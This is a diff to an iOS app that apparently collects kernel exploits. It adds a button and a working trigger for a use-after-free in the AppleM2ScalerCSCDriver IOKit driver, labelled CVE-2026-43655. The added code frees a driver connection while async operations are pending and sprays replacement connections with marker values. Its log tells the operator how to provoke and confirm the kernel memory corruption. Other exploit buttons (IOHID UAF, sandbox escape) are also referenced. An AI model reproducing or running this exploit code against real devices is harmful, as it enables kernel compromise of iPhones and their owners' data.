@@ -215,6 +215,7 @@ static const char kOpenPropertiesGarbage[] =
 @property (nonatomic, strong) UIButton   *iohidUAFButton;
 @property (nonatomic, strong) UIButton   *sandboxEscapeButton;
 @property (nonatomic, strong) UIButton   *appIntentButton;
+@property (nonatomic, strong) UIButton   *scalerUAFButton;
 @property (nonatomic, strong) UITextView *logView;
 @property (nonatomic, assign) int  proofCrossClientEvents;
 @property (nonatomic, assign) int  proofCrossClientChecks;
@@ -741,6 +742,15 @@ static void *e2_free_and_ool_racer(void *arg) {
     [self.appIntentButton addTarget:self action:@selector(appIntentTapped) forControlEvents:UIControlEventTouchUpInside];
     [self.view addSubview:self.appIntentButton];
 
+    self.scalerUAFButton = [UIButton buttonWithType:UIButtonTypeSystem];
+    self.scalerUAFButton.translatesAutoresizingMaskIntoConstraints = NO;
+    UIButtonConfiguration *scalerConf = [UIButtonConfiguration filledButtonConfiguration];
+    scalerConf.baseBackgroundColor = [UIColor systemIndigoColor];
+    self.scalerUAFButton.configuration = scalerConf;
+    [self.scalerUAFButton setTitle:@"CVE-2026-43655 Scaler UAF v1" forState:UIControlStateNormal];
+    [self.scalerUAFButton addTarget:self action:@selector(scalerUAFTapped) forControlEvents:UIControlEventTouchUpInside];
+    [self.view addSubview:self.scalerUAFButton];
+
     self.logView = [[UITextView alloc] initWithFrame:CGRectZero];
     self.logView.translatesAutoresizingMaskIntoConstraints = NO;
     self.logView.editable = NO;
@@ -769,7 +779,10 @@ static void *e2_free_and_ool_racer(void *arg) {
         [self.appIntentButton.topAnchor constraintEqualToAnchor:self.sandboxEscapeButton.bottomAnchor constant:12],
         [self.appIntentButton.centerXAnchor constraintEqualToAnchor:safe.centerXAnchor],
         [self.appIntentButton.widthAnchor constraintGreaterThanOrEqualToConstant:220],
-        [self.logView.topAnchor constraintEqualToAnchor:self.appIntentButton.bottomAnchor constant:20],
+        [self.scalerUAFButton.topAnchor constraintEqualToAnchor:self.appIntentButton.bottomAnchor constant:12],
+        [self.scalerUAFButton.centerXAnchor constraintEqualToAnchor:safe.centerXAnchor],
+        [self.scalerUAFButton.widthAnchor constraintGreaterThanOrEqualToConstant:220],
+        [self.logView.topAnchor constraintEqualToAnchor:self.scalerUAFButton.bottomAnchor constant:20],
         [self.logView.leadingAnchor constraintEqualToAnchor:safe.leadingAnchor constant:16],
         [self.logView.trailingAnchor constraintEqualToAnchor:safe.trailingAnchor constant:-16],
         [self.logView.bottomAnchor constraintEqualToAnchor:safe.bottomAnchor constant:-16],
@@ -7805,6 +7818,139 @@ static void *iohid_threadCopyEvent(void *arg) {
     [log appendFormat:@"  Files read: %d\n", hits];
 
     dispatch_async(dispatch_get_main_queue(), ^{ [self appendLog:log]; });
+}
+
+// ============================================================
+// CVE-2026-43655 — AppleM2ScalerCSCDriver shared scheduler UAF
+// iOS 26.2 vulnerable, patched in 26.5
+// Driver present on A15 despite "M2" name (media engine arch)
+// ============================================================
+#define TSD_SIZE 0x1B0
+
+- (void)scalerUAFTapped {
+    [self appendLog:@"\n============================================================"];
+    [self appendLog:@"  CVE-2026-43655 — AppleM2ScalerCSCDriver Scheduler UAF"];
+    [self appendLog:@"  Victim: credit=0xDEAD0001 / Spray: credit=0xBEEF0002"];
+    [self appendLog:@"  iPhone 13 has NO Dynamic Island — use Control Center instead"];
+    [self appendLog:@"============================================================\n"];
+
+    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+        [self runScalerUAF];
+    });
+}
+
+- (void)runScalerUAF {
+    mach_port_t mp; IOMainPort(kIOMainPortDefault, &mp);
+    io_service_t svc = IOServiceGetMatchingService(mp, IOServiceMatching("AppleM2ScalerCSCDriver"));
+    if (!svc) {
+        [self appendLog:@"[FATAL] AppleM2ScalerCSCDriver service NOT FOUND on this device"];
+        [self appendLog:@"This likely means the driver doesn't exist on A15 / iPhone 13"];
+        [self appendLog:@"(despite DarkSword working on A15, kext name may differ by SoC)"];
+        return;
+    }
+    [self appendLog:@"[OK] AppleM2ScalerCSCDriver service found"];
+
+    // === STEP 1: Open victim connection ===
+    [self appendLog:@"\n--- STEP 1: Open victim connection ---"];
+    io_connect_t victim = IO_OBJECT_NULL;
+    IOReturn kr = IOServiceOpen(svc, mach_task_self(), 0, &victim);
+    [self appendLog:[NSString stringWithFormat:@"Victim conn: 0x%x (kr=0x%x)", victim, kr]];
+    if (kr != 0 || !victim) {
+        [self appendLog:@"[FAIL] Cannot open victim connection"];
+        IOObjectRelease(svc);
+        return;
+    }
+
+    // Create IOSurface pair
+    NSDictionary *sp = @{(id)kIOSurfaceWidth:@(32),(id)kIOSurfaceHeight:@(32),
+                         (id)kIOSurfaceBytesPerElement:@(4),(id)kIOSurfacePixelFormat:@(0x42475241)};
+    IOSurfaceRef srcS = IOSurfaceCreate((__bridge CFDictionaryRef)sp);
+    IOSurfaceRef dstS = IOSurfaceCreate((__bridge CFDictionaryRef)sp);
+    uint32_t srcID = IOSurfaceGetID(srcS), dstID = IOSurfaceGetID(dstS);
+    [self appendLog:[NSString stringWithFormat:@"IOSurface: src=%u dst=%u", srcID, dstID]];
+
+    uint8_t baseline[TSD_SIZE];
+    memset(baseline, 0, TSD_SIZE);
+    *(uint32_t *)(baseline + 0) = srcID;
+    *(uint32_t *)(baseline + 4) = dstID;
+
+    // Sync baseline first
+    kr = IOConnectCallMethod(victim, 1, NULL, 0, baseline, TSD_SIZE, NULL, NULL, NULL, NULL);
+    [self appendLog:[NSString stringWithFormat:@"Sync baseline (sel=1): kr=0x%x", kr]];
+
+    // === STEP 2: Set credit marker and submit async ops ===
+    [self appendLog:@"\n--- STEP 2: credit=0xDEAD0001, 50 async ops ---"];
+    {
+        uint8_t s10[0x18]; memset(s10, 0, 0x18);
+        *(uint32_t *)s10 = 0xDEAD0001;
+        uint64_t sc[3] = {0,0,0};
+        kr = IOConnectCallMethod(victim, 10, sc, 3, s10, 0x18, NULL, NULL, NULL, NULL);
+        [self appendLog:[NSString stringWithFormat:@"Sel 10 (credit=0xDEAD0001): kr=0x%x", kr]];
+    }
+
+    int asyncOK = 0;
+    for (int i = 0; i < 50; i++) {
+        uint8_t async_tsd[TSD_SIZE];
+        memcpy(async_tsd, baseline, TSD_SIZE);
+        *(uint64_t *)(async_tsd + 0x008) = 1;  // Async path
+        kr = IOConnectCallMethod(victim, 1, NULL, 0, async_tsd, TSD_SIZE, NULL, NULL, NULL, NULL);
+        if (kr == 0) asyncOK++;
+    }
+    [self appendLog:[NSString stringWithFormat:@"Async ops: %d/50 OK", asyncOK]];
+
+    // === STEP 3: Close victim connection ===
+    [self appendLog:@"\n--- STEP 3: CLOSE victim (free per_client + ops) ---"];
+    kr = IOServiceClose(victim);
+    [self appendLog:[NSString stringWithFormat:@"IOServiceClose: kr=0x%x", kr]];
+    [self appendLog:@"Stale scheduler entries may still reference freed memory"];
+
+    // === STEP 4: Spray replacement connections ===
+    [self appendLog:@"\n--- STEP 4: Spray 50 connections (credit=0xBEEF0002) ---"];
+    io_connect_t spray[50];
+    int sprayOK = 0;
+    for (int i = 0; i < 50; i++) {
+        spray[i] = IO_OBJECT_NULL;
+        kr = IOServiceOpen(svc, mach_task_self(), 0, &spray[i]);
+        if (kr == 0 && spray[i]) {
+            sprayOK++;
+            uint8_t s10[0x18]; memset(s10, 0, 0x18);
+            *(uint32_t *)s10 = 0xBEEF0002;
+            uint64_t sc[3] = {0,0,0};
+            IOConnectCallMethod(spray[i], 10, sc, 3, s10, 0x18, NULL, NULL, NULL, NULL);
+        }
+    }
+    [self appendLog:[NSString stringWithFormat:@"Spray: %d/50 OK", sprayOK]];
+
+    // === STEP 5: Trigger scheduler via compositor activity ===
+    [self appendLog:@"\n--- STEP 5: Submit ops on spray + WAIT FOR TRIGGER ---"];
+    [self appendLog:@"iPhone 13: Swipe Control Center or Notification Center"];
+    [self appendLog:@"This drives SpringBoard compositor → scaler scheduler"];
+    [self appendLog:@"Expected: x9=0xBEEF0002 (UAF) or x9=0xDEAD0001 (stale)"];
+    [self appendLog:@"\nSubmitting ops on spray connections..."];
+
+    for (int round = 0; round < 100; round++) {
+        for (int i = 0; i < sprayOK && i < 50; i++) {
+            if (spray[i]) {
+                uint8_t async_tsd[TSD_SIZE];
+                memcpy(async_tsd, baseline, TSD_SIZE);
+                *(uint64_t *)(async_tsd + 0x008) = 1;
+                IOConnectCallMethod(spray[i], 1, NULL, 0, async_tsd, TSD_SIZE, NULL, NULL, NULL, NULL);
+            }
+        }
+        if (round % 10 == 0) {
+            [self appendLog:[NSString stringWithFormat:@"  Round %d/100 — SWIPE CONTROL CENTER NOW", round]];
+        }
+        usleep(100000);
+    }
+
+    [self appendLog:@"\n=== DONE: 100 rounds completed ==="];
+    [self appendLog:@"If device hasn't panicked, swipe Control Center"];
+    [self appendLog:@"Then check panic log for x9 register value"];
+    [self appendLog:@"x9=0xBEEF0002 → UAF confirmed (spray marker read)"];
+
+    IOObjectRelease(svc);
+    // Keep alive for delayed scheduler trigger
+    while (1) { sleep(5); [self appendLog:@"  alive (waiting for scheduler trigger)..."]; }
 }
 
 @end
